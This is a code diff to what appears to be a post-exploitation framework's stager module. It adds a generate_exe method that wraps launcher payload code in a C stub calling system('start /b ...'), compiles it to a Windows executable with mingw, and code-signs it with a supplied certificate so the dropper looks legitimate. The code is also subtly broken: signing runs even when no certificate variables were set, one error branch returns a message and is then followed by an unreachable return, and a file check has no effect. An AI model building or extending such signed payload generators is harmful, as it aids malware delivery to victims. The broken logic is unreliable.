@@ -132,6 +132,45 @@ class Stagers:
         else:
             print helpers.color("[!] Original .dll for arch %s does not exist!" % (arch))
 
+    def generate_exe(self, launcherCode, certPath):
+   
+   
+        cSourceCode = "#include <stdlib.h>\n void main(){system(\"start /b %s\");}" % (launcherCode)
+        f = open(self.mainMenu.installPath + "/data/misc/launcher.c", 'w')
+        f.write(cSourceCode)
+        f.close()
+        if certPath != '':
+            pemFile = ''
+            keyFile = ''
+            for f in os.listdir(self.mainMenu.installPath + certPath):
+                if f.endswith(".pem"):
+                    pemFile = os.path.join(self.mainMenu.installPath + certPath, f)
+                if f.endswith(".key"):
+                    keyFile = os.path.join(self.mainMenu.installPath + certPath, f)
+            if pemFile == '': 
+                print helpers.color("[!] Could not find .pem file!")
+                return ""
+            if keyFile == '':
+                return helpers.color("[!] Could not find .key file!")
+                return ""
+       
+                
+        os.path.isfile(self.mainMenu.installPath + "/data/misc/launcher.exe")
+   
+        os.system("i686-w64-mingw32-gcc -s %s -o %s" % (self.mainMenu.installPath + "/data/misc/launcher.c", self.mainMenu.installPath + "/data/misc/launcher.exe"))
+        if not os.path.isfile(self.mainMenu.installPath + "/data/misc/launcher.exe"):
+            print helpers.color("[!] Failed to compile exe!")
+            return ""
+        else:
+            print helpers.color("[-] Codesigning: ")
+            os.system("osslsigncode sign -certs %s -key %s -in %s -out %s" % (pemFile, keyFile, self.mainMenu.installPath + "/data/misc/launcher.exe", self.mainMenu.installPath + "/data/misc/signed-launcher.exe"))
+            exeFile = open(self.mainMenu.installPath + "/data/misc/signed-launcher.exe", 'rb')
+            exe = exeFile.read()
+            exeFile.close()
+           
+            os.remove(self.mainMenu.installPath + "/data/misc/signed-launcher.exe")
+            os.remove(self.mainMenu.installPath + "/data/misc/launcher.exe")
+            return exe
 
     def generate_macho(self, launcherCode):
         """
